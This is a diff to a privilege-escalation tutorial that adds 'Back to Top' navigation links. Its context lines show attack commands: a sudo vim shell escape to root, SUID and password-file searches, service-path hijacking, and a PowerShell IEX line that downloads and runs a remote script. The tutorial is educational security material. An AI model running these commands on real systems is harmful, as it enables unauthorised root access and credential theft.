@@ -1,5 +1,8 @@
 # Privilege Escalation Tutorial: From Low Priv to Root
 
+
+<a name="top"></a>
+
 This tutorial assumes you already have a low-privilege shell on a target system. You know how to run basic commands. Now you need to get root (or SYSTEM).
 
 > ⚠️ **Legal Disclaimer**  
@@ -32,6 +35,9 @@ Think of it like this: You're in the lobby of a building. You need to get to the
 For a complete command reference, see [README.md](README.md). For a one-page cheat sheet, see [QUICKREF.md](QUICKREF.md).
 
 ---
+
+
+[🔝 Back to Top](#top)
 
 ## 2. Linux Privesc: Enumeration First
 
@@ -84,6 +90,8 @@ User www-data may run the following commands on target:
 - That `sudo -l` output shows that `www-data` can run `find` as root with no password. That's a vulnerability.
 
 
+[🔝 Back to Top](#top)
+
 ## 3. Linux Privesc: SUID Binary Exploit
 
 - SUID (Set User ID) binaries run with the file owner's privileges. If an SUID binary is owned by root, it runs as root.
@@ -118,6 +126,9 @@ find / -perm -4000 -type f 2>/dev/null
 root
 ```
 
+
+[🔝 Back to Top](#top)
+
 ---
 
 ## 4. Linux Privesc: Sudo Misconfiguration
@@ -151,6 +162,9 @@ sudo vim -c '!sh'
 # whoami
 root
 ```
+
+
+[🔝 Back to Top](#top)
 
 ---
 
@@ -190,6 +204,9 @@ findstr /si password *.txt *.ini *.config
 |`reg query`| Registry startup entries|
 |`findstr /si password`| Search for passwords in files|
 
+
+[🔝 Back to Top](#top)
+
 ---
 
 ## 6. Windows Privesc: Unquoted Service Path
@@ -223,6 +240,9 @@ dir "C:\Program Files\My Service\"
 ```
 
 - If you can write to that directory (or a parent directory like C:\Program Files\), you can place a malicious executable named Program.exe or My.exe or Service.exe depending on the path.
+
+
+[🔝 Back to Top](#top)
 
 ---
 
@@ -260,6 +280,9 @@ Get-CimInstance Win32_Service | ForEach-Object {
 }
 ```
 
+
+[🔝 Back to Top](#top)
+
 ---
 
 ## 8. Running Automated Enumeration Scripts
@@ -286,6 +309,9 @@ powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https:
 
 - These scripts do in seconds what would take you hours.
 
+
+[🔝 Back to Top](#top)
+
 ---
 
 ## 9. Next Steps
@@ -300,6 +326,8 @@ powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https:
 
 Remember: Privilege escalation is a skill. You won't get it right away. Practice on intentionally vulnerable machines. Learn from failures. Eventually, you'll see the patterns.
 
+
+[🔝 Back to Top](#top)
 
 
 
